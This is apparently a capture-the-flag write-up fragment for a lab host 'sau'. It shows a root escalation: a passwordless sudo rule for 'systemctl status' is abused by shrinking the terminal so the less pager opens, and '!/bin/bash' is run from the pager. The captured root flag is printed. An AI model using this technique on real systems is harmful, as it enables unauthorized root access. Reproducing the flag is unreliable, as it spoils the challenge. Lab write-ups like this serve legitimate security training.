```bash
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
=> puma can run `/usr/bin/systemctl status trail.service` as sudo

When running this command the output is just printed on the screen without the pager being invoked:
```bash
sudo /usr/bin/systemctl status trail.service
```

This is because the stty settings (rows, columns) are big enough to display the command output and so the pager is not invoked.
If we set a low row count the pager (less) will be invoked:
```bash
stty -a
# speed 38400 baud; rows 55; columns 236; line = 0;

# Set row count to 5, to invoke pager
stty rows 5; stty cols 120
```

When we run the command again, the output will be opened in less:
```bash
sudo systemctl status trail.service
```

From less we can execute a command (bash) and thus get a root shell:
```
!/bin/bash
root@sau:/opt/maltrail# whoami
root
root@sau:/opt/maltrail# ls -l /root
total 8
drwxr-xr-x 4 root root 4096 Jun 19  2023 go
-rw-r----- 1 root root   33 Dec  4 08:50 root.txt
root@sau:/opt/maltrail# cat /root/root.txt
1daed30d89857b76a0934f59d34fb0b7
```
